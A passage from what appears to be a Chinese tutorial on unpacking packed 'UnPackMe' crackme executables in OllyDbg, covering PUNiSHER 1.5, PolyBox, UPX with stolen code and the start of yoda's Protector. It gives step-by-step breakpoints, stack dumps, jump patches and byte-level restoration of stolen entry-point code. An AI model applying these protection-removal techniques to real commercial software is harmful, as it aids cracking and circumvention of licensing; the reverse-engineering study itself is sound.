class="line">00471E19    85DB            test ebx,ebx                             ; UnPackMe.004558C4</span><br><span class="line">00471E1B    74 33           je short UnPackMe.00471E50</span><br><span class="line">00471E1D    8BC3            mov eax,ebx                              ; UnPackMe.004558C4</span><br><span class="line">00471E1F    F7C3 00000080   test ebx,0x80000000</span><br><span class="line">00471E25    74 08           je short UnPackMe.00471E2F</span><br><span class="line">00471E27    81E3 FFFF0000   and ebx,0xFFFF</span><br><span class="line">00471E2D    EB 04           jmp short UnPackMe.00471E33</span><br><span class="line">00471E2F    43              inc ebx                                  ; UnPackMe.004558C4</span><br><span class="line">00471E30    43              inc ebx                                  ; UnPackMe.004558C4</span><br><span class="line">00471E31    03DA            add ebx,edx                              ; UnPackMe.00400000</span><br><span class="line">00471E33    51              push ecx                                 ; UnPackMe.00455184</span><br><span class="line">00471E34    52              push edx                                 ; UnPackMe.00400000</span><br><span class="line">00471E35    899D C2214000   mov dword ptr ss:[ebp+0x4021C2],ebx      ; UnPackMe.004558C4</span><br><span class="line">00471E3B    53              push ebx                                 ; UnPackMe.004558C4</span><br><span class="line">00471E3C    FFB5 BA214000   push dword ptr ss:[ebp+0x4021BA]         ; kernel32.7C800000</span><br><span class="line">00471E42    E8 32010000     call UnPackMe.00471F79</span><br><span class="line">00471E47    5A              pop edx                                  ; UnPackMe.00471DBC</span><br><span class="line">00471E48    59              pop ecx                                  ; UnPackMe.00471DBC</span><br><span class="line">00471E49    85C0            test eax,eax                             ; UnPackMe.0047214A</span><br><span class="line">00471E4B    74 05           je short UnPackMe.00471E52</span><br><span class="line">00471E4D    AB              stos dword ptr es:[edi]</span><br><span class="line">00471E4E  ^ EB C4           jmp short UnPackMe.00471E14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00455178  7C801EF2  kernel32.GetStartupInfoA</span><br><span class="line">0045517C  00471F79  UnPackMe.00471F79</span><br></pre></td></tr></table></figure><p>再准确一点，程序运行完下面这条指令，<code>45517C</code>显示被加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00471E4D    AB              stos dword ptr es:[edi]</span><br></pre></td></tr></table></figure><p>STOS指令：是将AL/AX/EAX的值存储到[EDI]指定的内存单元中。</p><p>往上看最近的eax就是call产生的。所以这个call很可能是加密函数。跟进去，着重看寄存器eax。我们已知<code>455178</code>的函数没有被加密，程序运行到这一步，eax显示函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FBF    85C0            test eax,eax                                       ; kernel32.GetStartupInfoA</span><br><span class="line">00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现</span><br></pre></td></tr></table></figure><p>到这一步eax显示为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FDF    85C0            test eax,eax</span><br><span class="line">00471FE1   /74 02           je short UnPackMe.00471FE5;跳转实现</span><br></pre></td></tr></table></figure><p>一路到stos，函数出现在数据窗口。第二次循环就是我们要找的<code>45517C</code>的函数。进去到<code>471FBF</code>处，这已经显示了<code>45517C</code>未加密的系统函数<code>kernel32.GetProcAddress</code>，可以直接在import REC上修改。但我们需要将所有被加密的函数还原，不可能一个一个这样找，太麻烦了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FBF    85C0            test eax,eax                                       ; kernel32.GetProcAddress</span><br><span class="line">00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现</span><br></pre></td></tr></table></figure><p>继续对比两者异同，到这一步eax显示的是加密函数<code>UnPackMe.00471F79</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FDF    85C0            test eax,eax                                       ; UnPackMe.00471F79</span><br><span class="line">00471FE1    74 02           je short UnPackMe.00471FE5;没有实现</span><br></pre></td></tr></table></figure><p>在<code>471FE1</code>处，未加密函数跳转实现而加密函数跳转未实现，所以应该将<code>471FE1</code>处的跳转改为<code>jmp</code>。继续单步观察数据窗口，验证修改是否正确。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00455178  7C801EF2  kernel32.GetStartupInfoA</span><br><span class="line">0045517C  7C80AE40  kernel32.GetProcAddress</span><br></pre></td></tr></table></figure><p>复制到可执行文件，将新的程序载入OD寻找OEP，脱壳，没有无效指针，程序成功运行。</p><h2 id="7-12-PUNiSHER-1-5"><a href="#7-12-PUNiSHER-1-5" class="headerlink" title="7.12 PUNiSHER 1.5"></a>7.12 PUNiSHER 1.5</h2><p>这个壳比较特殊，下面用原版OD进行破解。首先忽略所有异常，隐藏好OD。Options -&gt; Debugging options -&gt; Exceptions，全选。</p><p>载入OD，程序停在此处。在命令行下断<code>bp LoadLibraryA+5</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00408061 &gt; /EB 04           jmp short UnPackMe.00408067</span><br><span class="line">00408063   |83A4BC CE60EB04&gt;and dword ptr ss:[esp+edi*4+0x4EB60CE],0&gt;</span><br><span class="line">0040806B    BC 0411E800     mov esp,0xE81104</span><br></pre></td></tr></table></figure><p>Shift + F9运行程序，查看堆栈变化，第一次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF98   FFFEBDA9</span><br><span class="line">0012FF9C   004083EC  RETURN to UnPackMe.004083EC</span><br><span class="line">0012FFA0   0040821F  ASCII &quot;USER32.DLL&quot;</span><br><span class="line">0012FFA4   005E5918</span><br></pre></td></tr></table></figure><p>Shift + F9第二次，已经看到<code>LoadLibraryA</code>了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012E9B4  /0012EA5C</span><br><span class="line">0012E9B8  |73FBE2BF  RETURN to usp10.73FBE2BF from kernel32.LoadLibraryA</span><br><span class="line">0012E9BC  |73FA1840  ASCII &quot;gdi32.dll&quot;</span><br><span class="line">0012E9C0  |73FBE4B9  usp10.&lt;ModuleEntryPoint&gt;</span><br></pre></td></tr></table></figure><p>再Shift + F9一次，此时为我们的最佳返回时机。Alt + F9返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF98   FFFA31E5</span><br><span class="line">0012FF9C   003C0470  RETURN to 003C0470</span><br><span class="line">0012FFA0   003C00B7  ASCII &quot;USER32.DLL&quot;</span><br><span class="line">0012FFA4   005E5918</span><br></pre></td></tr></table></figure><p>取消断点，F8单步，遇到向上跳转时忽略，继续往下。直到去到<code>003C08C5</code>处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">003C08C5    8D85 ADD64100   lea eax,dword ptr ss:[ebp+0x41D6AD]</span><br><span class="line">003C08CB    870424          xchg dword ptr ss:[esp],eax              ; UnPackMe.00402494</span><br><span class="line">003C08CE    FF95 E1CE4100   call dword ptr ss:[ebp+0x41CEE1]         ; kernel32.OutputDebugStringA</span><br><span class="line">003C08D4    80BD E9CE4100 0&gt;cmp byte ptr ss:[ebp+0x41CEE9],0x0</span><br></pre></td></tr></table></figure><p>此时，信息窗口显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Address=003C0892, (ASCII &quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)</span><br><span class="line">eax=00402494 (UnPackMe.00402494)</span><br></pre></td></tr></table></figure><p>把上面的汇编代码前两行NOP掉，避免产生溢出错误。继续往下，来到两个连续的jmp指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">003C0B1C  ^\EB BF           jmp short 003C0ADD;不跳转</span><br><span class="line">003C0B1E  ^ E9 36FEFFFF     jmp 003C0959;跳转</span><br></pre></td></tr></table></figure><p>第一个jmp指令不跳，第二个jmp指令跳转。跳转后继续单步，看到大跳转了，跳过去就是Stolen Code的开始处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">003C0959    8B85 EACE4100   mov eax,dword ptr ss:[ebp+0x41CEEA]</span><br><span class="line">003C095F    8D9D FEDC4100   lea ebx,dword ptr ss:[ebp+0x41DCFE]</span><br><span class="line">003C0965    50              push eax</span><br><span class="line">003C0966    E8 0E000000     call 003C0979</span><br><span class="line">003C096B    50              push eax</span><br><span class="line">003C096C    53              push ebx                                 ; UnPackMe.00400000</span><br><span class="line">003C096D    E8 8EF7FFFF     call 003C0100</span><br><span class="line">003C0972    83C4 08         add esp,0x8</span><br><span class="line">003C0975  - FF6424 FC       jmp dword ptr ss:[esp-0x4]</span><br><span class="line">003C0979    60              pushad</span><br><span class="line">003C097A    EB 04           jmp short 003C0980</span><br></pre></td></tr></table></figure><p>跳过去是jmp指令，继续F8找到熟悉的VC程序入口，遇到近call要F7跟进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">009F0000   /EB 04           jmp short 009F0006</span><br><span class="line">009F0002   |8182 8241D9EE E&gt;add dword ptr ds:[edx+0xEED94182],0x8C83&gt;</span><br><span class="line">009F000C    8C82 DB5C24FC   mov word ptr ds:[edx+0xFC245CDB],es</span><br><span class="line">009F0012    EB 04           jmp short 009F0018</span><br></pre></td></tr></table></figure><p>来到这儿时，终于看到被抽取代码的了，VC程序入口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">009F022D    90              nop</span><br><span class="line">009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">009F0234    50              push eax</span><br><span class="line">009F0235    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">009F023C    83EC 68         sub esp,0x68</span><br><span class="line">009F023F    53              push ebx</span><br><span class="line">009F0240    56              push esi                                 ; UnPackMe.00404038</span><br><span class="line">009F0241    57              push edi                                 ; UnPackMe.00407B90</span><br><span class="line">009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">009F0245    33DB            xor ebx,ebx</span><br><span class="line">009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx</span><br></pre></td></tr></table></figure><p>但是前面还缺少了55开头的OEP，此时堆栈前2行就是第4、第5行push的地址。自行补上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp esp</span><br><span class="line">push -1</span><br><span class="line">push 004023D0</span><br><span class="line">push 00401616</span><br></pre></td></tr></table></figure><p>继续找被抽取的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">009F02B7    90              nop</span><br><span class="line">009F02B8    FF15 7C214000   call dword ptr ds:[0x40217C]             ; msvcrt.__set_app_type</span><br><span class="line">009F02BE    59              pop ecx</span><br><span class="line">009F02BF    830D 3C314000 F&gt;or dword ptr ds:[0x40313C],0xFFFFFFFF</span><br><span class="line">009F02C6    830D 40314000 F&gt;or dword ptr ds:[0x403140],0xFFFFFFFF</span><br><span class="line">009F02CD    FF15 78214000   call dword ptr ds:[0x402178]             ; msvcrt.__p__fmode</span><br><span class="line">009F02D3    8B0D 30314000   mov ecx,dword ptr ds:[0x403130]</span><br><span class="line">009F02D9    8908            mov dword ptr ds:[eax],ecx</span><br><span class="line">009F02DB    FF15 74214000   call dword ptr ds:[0x402174]             ; msvcrt.__p__commode</span><br><span class="line">009F02E1    8B0D 2C314000   mov ecx,dword ptr ds:[0x40312C]</span><br><span class="line">009F02E7    8908            mov dword ptr ds:[eax],ecx</span><br><span class="line">009F02E9    A1 70214000     mov eax,dword ptr ds:[0x402170]</span><br><span class="line">009F02EE    8B00            mov eax,dword ptr ds:[eax]</span><br><span class="line">009F02F0    A3 38314000     mov dword ptr ds:[0x403138],eax</span><br></pre></td></tr></table></figure><p>遇到下面这种垃圾语句一定要将它改为NOP，否则程序会出错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">009F037C    0F31            rdtsc</span><br></pre></td></tr></table></figure><p>接下来遇到这一语句，注释和信息窗口都显示0040开头，是我们的用户代码段，这里把指令转换，还原我们的真实地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">009F03DA    8B6D 00         mov ebp,dword ptr ss:[ebp]               ; UnPackMe.00401615</span><br></pre></td></tr></table></figure><p>即在被抽取代码段中添加<code>call 00401615</code>。</p><p>运行到这不要retn，F4运行到jmp处，继续F8单步走。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">009F0402    C3              retn</span><br><span class="line">009F0403    EB 04           jmp short 009F0409</span><br></pre></td></tr></table></figure><p>提取最后一句被抽取代码，retn去到伪OEP<code>401504</code>处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">009F0409    90              nop</span><br><span class="line">009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx;最后一句被抽取的代码</span><br><span class="line">009F0410    68 04154000     push 0x401504</span><br><span class="line">009F0415    C3              retn</span><br></pre></td></tr></table></figure><p>总结一下被抽取的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp esp</span><br><span class="line">push -1</span><br><span class="line">push 004023D0</span><br><span class="line">push 00401616</span><br><span class="line">009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">009F0234    50              push eax</span><br><span class="line">009F0235    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">009F023C    83EC 68         sub esp,0x68</span><br><span class="line">009F023F    53              push ebx</span><br><span class="line">009F0240    56              push esi                                 ; UnPackMe.00404038</span><br><span class="line">009F0241    57              push edi                                 ; UnPackMe.00407B90</span><br><span class="line">009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">009F0245    33DB            xor ebx,ebx</span><br><span class="line">009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx</span><br><span class="line">call 00401615</span><br><span class="line">009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx</span><br></pre></td></tr></table></figure><p>去到伪OEP，如果看到全是字节，右键 -&gt; Analysis -&gt; remove analysis from module 。这样就可以看到汇编代码了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401504   /75 0C           jnz short UnPackMe.00401512</span><br><span class="line">00401506   |68 12164000     push UnPackMe.00401612</span><br><span class="line">0040150B   |FF15 6C214000   call dword ptr ds:[0x40216C]             ; msvcrt.__setusermatherr</span><br><span class="line">00401511   |59              pop ecx                                  ; UnPackMe.00407B90</span><br><span class="line">00401512   \E8 E9000000     call UnPackMe.00401600</span><br></pre></td></tr></table></figure><p>往上拉发现代码被混淆，先不管。拉到retn下面的一句，也就是<code>4014A7</code>处，往下NOP到伪代码处。(后来发现4014A7不够，4014A6也需要NOP掉)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004014A1    c2 2513         retn 0x1325</span><br><span class="line">004014A4  ^ E3 A5           jecxz short UnPackMe.0040144B</span><br><span class="line">004014A6    cb              retf</span><br><span class="line">004014A7    7B D5           jpo short UnPackMe.0040147E</span><br><span class="line">004014A9    64:03d4         add edx,esp</span><br><span class="line">004014AC    3F              aas</span><br></pre></td></tr></table></figure><p>发现<code>401504</code>也被NOP掉了，选中被NOP掉的前3行右键 -&gt; Undo selection ，还原代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401504    90              nop</span><br><span class="line">00401505    90              nop</span><br><span class="line">00401506    90              nop</span><br><span class="line">00401507    1216            adc dl,byte ptr ds:[esi]</span><br><span class="line">00401509    40              inc eax</span><br></pre></td></tr></table></figure><p>接下来我们去段首可以选择二进制粘贴的形式，也可以采取逐一汇编的方式进行修改。</p><p>二进制代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 D0 23 40 00 68 16 16 40 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68</span><br><span class="line">53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 7C 21 40 00 59 83 0D 3C 31 40 00 FF 83 0D 40 31 40</span><br><span class="line">00 FF FF 15 78 21 40 00 8B 0D 30 31 40 00 89 08 FF 15 74 21 40 00 8B 0D 2C 31 40 00 89 08 A1 70</span><br><span class="line">21 40 00 8B 00 A3 38 31 40 00 E8 17 01 00 00 39 1D 50 30 40 00</span><br></pre></td></tr></table></figure><p>选中所有NOP二进制粘贴，新建EIP，运行loadPE和importREC，修正指针，脱壳成功。</p><h2 id="7-13-未知壳"><a href="#7-13-未知壳" class="headerlink" title="7.13  未知壳"></a>7.13  未知壳</h2><h3 id="7-13-1-PolyBox"><a href="#7-13-1-PolyBox" class="headerlink" title="7.13.1 PolyBox"></a>7.13.1 PolyBox</h3><p>这个是个捆绑壳，意思是伪装成其他类别的壳，加大脱壳的难度。</p><p>PEID查壳显示FSG壳，这种壳用了FSG的外衣，把要加壳的程序当成一种资源加密起来。</p><p>用FSG专用的ESP定律找到第2层壳的OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00402F18    55              push ebp</span><br><span class="line">00402F19    8BEC            mov ebp,esp</span><br><span class="line">00402F1B    83C4 F0         add esp,-0x10</span><br><span class="line">00402F1E    B8 C02E4000     mov eax,UnPackMe.00402EC0                ; ASCII &quot;\n&quot;</span><br></pre></td></tr></table></figure><p>在命令窗口输入<code>bp WriteProcessMemory</code>。<code>WriteProcessMemory</code>是读取程序的大小，也可以解释为处理写入的数据。F9运行，程序停在dll领空，查看堆栈窗口，它给程序写入了起始地址为<code>3D0000</code>的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0012FDE4   0040201B  /CALL 到 WriteProcessMemory 来自 UnPackMe.00402016</span><br><span class="line">0012FDE8   00000048  |hProcess = 00000048 (window)</span><br><span class="line">0012FDEC   00400000  |Address = 0x400000</span><br><span class="line">0012FDF0   003D0000  |Buffer = 003D0000</span><br><span class="line">0012FDF4   00001000  |BytesToWrite = 1000 (4096.)</span><br><span class="line">0012FDF8   0012FF48  \pBytesWritten = 0012FF48</span><br><span class="line">0012FDFC   0012FE08  指向下一个 SEH 记录的指针</span><br></pre></td></tr></table></figure><p>用LoadPE找到进程，右键-&gt;区域转存，找到起始地址为<code>3D0000</code>的区域转存，后缀名改为exe即可运行。</p><h3 id="7-13-2-UPX-Stolen-Code"><a href="#7-13-2-UPX-Stolen-Code" class="headerlink" title="7.13.2 UPX(Stolen Code)"></a>7.13.2 UPX(Stolen Code)</h3><p>单步和ESP定律都不太行，用两次内存镜像到达一串jmp指令的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004014E4  - FF25 1C204000   jmp dword ptr ds:[&lt;&amp;MFC42.#CWinApp::InitApplication_3922&gt;]                ; mfc42.#CWinApp::InitApplication_3922</span><br><span class="line">004014EA  - FF25 20204000   jmp dword ptr ds:[&lt;&amp;MFC42.#CWinApp::AddToRecentFileList_1089&gt;]            ; mfc42.#CWinApp::AddToRecentFileList_1089</span><br></pre></td></tr></table></figure><p>很明显这是由MFC写的程序，拿一个完整的MFC程序做对比。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0040163D     C3                        RETN</span><br><span class="line">0040163E   - FF25 94214000             JMP DWORD PTR DS:[&lt;&amp;msvcrt.__CxxFrameHandler&gt;]  </span><br><span class="line">00401644     CC                        INT3</span><br><span class="line">00401645     CC                        INT3</span><br><span class="line">0040164F     CC                        INT3</span><br><span class="line">00401650   - FF25 90214000             JMP DWORD PTR DS:[&lt;&amp;msvcrt._except_handler3&gt;]   </span><br><span class="line">00401656     55                        PUSH EBP;这里是OEP</span><br><span class="line">00401657     8BEC                      MOV EBP,ESP</span><br><span class="line">00401659     6A FF                     PUSH -1</span><br><span class="line">0040165B     68 E0234000               PUSH 004023E0</span><br><span class="line">00401660     68 50164000               PUSH &lt;JMP.&amp;msvcrt._except_handler3&gt;             </span><br><span class="line">00401665     64:A1 00000000            MOV EAX,DWORD PTR FS:[0]</span><br></pre></td></tr></table></figure><p>被偷代码的程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">004016F5    C3              retn</span><br><span class="line">004016F6  - FF25 A4214000   jmp dword ptr ds:[&lt;&amp;MSVCRT.__CxxFrameHandler&gt;]               ; msvcrt.__CxxFrameHandler</span><br><span class="line">004016FC    CC              int3</span><br><span class="line">004016FD    CC              int3</span><br><span class="line">004016FE    CC              int3</span><br><span class="line">004016FF    CC              int3</span><br><span class="line">00401700    98              cwde</span><br><span class="line">00401701    e5 27           in eax,0x27</span><br><span class="line">00401703    69AB ED2F71B3 0&gt;imul ebp,dword ptr ds:[ebx-0x4C8ED013],0xC6844200</span><br><span class="line">0040170D    084A 64         or byte ptr ds:[edx+0x64],cl</span><br><span class="line">00401710    A1 00000000     mov eax,dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>OEP前面的代码都是一样的，所以我们要找<code>&lt;&amp;msvcrt._except_handler3&gt;</code>函数的地址。查看与它同模块的<code>&lt;&amp;MSVCRT.__CxxFrameHandler&gt;</code>的地址(双击即可查看)为<code>4021A4</code>，在命令窗口输入<code>d 4021A4</code>回车。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00402194 &gt;77C05C94  msvcrt._except_handler3</span><br><span class="line">00402198 &gt;77C1EE4F  msvcrt._controlfp</span><br><span class="line">0040219C &gt;77C04DF8  msvcrt._onexit</span><br><span class="line">004021A0 &gt;77C04E51  msvcrt.__dllonexit</span><br><span class="line">004021A4 &gt;77BF27FA  msvcrt.__CxxFrameHandler</span><br></pre></td></tr></table></figure><p>很容易找到<code>&lt;&amp;msvcrt._except_handler3&gt;</code>的地址为<code>402194</code>，然后是入口代码，都一样的，只有两个下面的push指令不一样。因为第二个push也刚好是<code>&lt;&amp;msvcrt._except_handler3&gt;</code>函数地址，所以我们只需找第一个push的地址。</p><p>把堆栈窗口的滚动条往下拉到底(因为最先压栈的在最底部)，从下往上看，找到第一个压入的程序函数，就是我们第一个push进去的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0012FFD0   0012FFE0  指向下一个 SEH 记录的指针</span><br><span class="line">0012FFD4   00401886  SE处理程序</span><br><span class="line">0012FFD8   00402500  UnPackMe.00402500;程序函数，所以是这个</span><br><span class="line">0012FFDC   00000000</span><br><span class="line">0012FFE0   0012CFA0  指向下一个 SEH 记录的指针</span><br><span class="line">0012FFE4   7C839AD8  SE处理程序</span><br><span class="line">0012FFE8   7C817080  返回到 kernel32.7C817080;这个是系统函数，不是</span><br><span class="line">0012FFEC   00000000</span><br><span class="line">0012FFF0   00000000</span><br><span class="line">0012FFF4   00000000</span><br><span class="line">0012FFF8   00407000  UnPackMe.&lt;ModuleEntryPoint&gt;;这个是入口点</span><br><span class="line">0012FFFC   00000000</span><br></pre></td></tr></table></figure><p>还有最后一句，正常程序的代码为<code>64:A1 00000000</code>，而加壳程序的代码与上面一句混淆了，所以也要将它修改为<code>64:A1 00000000</code>。</p><p>将代码拼凑起来，由于中间的代码不够用，所以把第1行jmp去掉，因为其它代码都是入口点必须的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jmp 402194;去掉</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">push -1</span><br><span class="line">push 402500</span><br><span class="line">push 402194</span><br><span class="line">mov eax,dword ptr fs:[0]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401700    55              push ebp;将此处设置为新EIP</span><br><span class="line">00401701    8BEC            mov ebp,esp</span><br><span class="line">00401703    6A FF           push -0x1</span><br><span class="line">00401705    68 00254000     push UnPackMe.00402500</span><br><span class="line">0040170A    68 94214000     push &lt;&amp;MSVCRT._except_handler3&gt;</span><br><span class="line">0040170F    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br></pre></td></tr></table></figure><p>这时用ODdump说“不能创建程序”，用LoadPE也不能抓取进程，是因为这个程序由反调试功能。用任务管理器将程序进程结束，再在OD用ODdump即可。</p><h3 id="7-13-3-yoda’s-Protector-1-03-3"><a href="#7-13-3-yoda’s-Protector-1-03-3" class="headerlink" title="7.13.3 yoda’s Protector 1.03.3"></a>7.13.3 yoda’s Protector 1.03.3</h3><p>PEID说是这个壳，但也不知道是不是。OD载入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040A6ED &gt;  E8 03000000     call UnPackMe.0040A6F5</span><br><span class="line">0040A6F2    EB 01           jmp short UnPackMe.0040A6F5</span><br><span class="line">0040A6F4    E9 